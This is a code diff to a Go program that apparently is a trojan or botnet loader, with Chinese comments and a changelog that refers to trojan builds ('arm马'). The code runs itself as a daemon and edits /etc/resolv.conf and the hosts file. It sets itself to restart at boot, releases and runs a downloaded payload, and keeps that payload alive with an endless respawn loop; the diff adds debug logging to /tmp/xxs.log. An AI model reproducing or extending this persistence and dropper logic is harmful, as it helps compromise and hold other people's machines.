@@ -8,6 +8,7 @@ import (
 	"add"
 	"cpack"
 	"path/filepath"
+	"log"
 )
 
 //////////////获取自身文件名
@@ -62,10 +63,17 @@ func file()  (s1,s2,s3,s4 string){
 
 
 func main() {
-
-	cpack.Daemon()//（后台运行）
-	add.AppendToFile("/etc/resolv.conf","nameserver 8.8.8.8      //google\r\nnameserver 114.114.114.114      //114\r\n")//修复dns
 	filenameOnly,_,_,filepath:=file()
+	cpack.Daemon()//（后台运行）
+	add.Hosts0()
+	if cpack.Log ==true {
+		fileName := "/tmp/xxs.log"
+		logFile,_  := os.Create(fileName)
+		defer logFile.Close()
+		add.DebugLog = log.New(logFile,"[Info]",log.Llongfile)
+		add.DebugLog.Println("程序启动")
+	}
+	add.AppendToFile("/etc/resolv.conf","nameserver 8.8.8.8      //google\r\nnameserver 114.114.114.114      //114\r\n")//修复dns
 	add.Sh(filenameOnly,filepath)
 	add.Boot(filenameOnly)//重启上线，暂时这么写
 	downloadfile :=cpack.Filename
@@ -74,7 +82,7 @@ func main() {
 	add.RunFile(downloadfile) //释放文件并且运行啦
 	for true { //无限循环
 		if cpack.CsExistProcess(downloadfile)==false {//false为主，不然可能无限复活
-
+			add.Buglog("CsExistProcess")
 			time.Sleep(500)
 			add.Kill()
 			add.RunFile(downloadfile)//进程死了就启动
@@ -100,6 +108,7 @@ http://blog.xn--pssa2683b.top/
 7月24日2.3发布：增加arm马，新增生成分组，增加了自定义进程功能
 8月11日2.3.1发布：暂时删除arm马，修复了部分系统无限复活的bug，尝试解决部分系统内核释放不完整，优化了整体代码.
 10月3日2.4完成：增加了cpuk，自定义k，修复了dns问题，增加了服务启动
+10月20日2.5完成：对win进行优化，更换最新内核.
  */
 
 /********************************************************************************************************
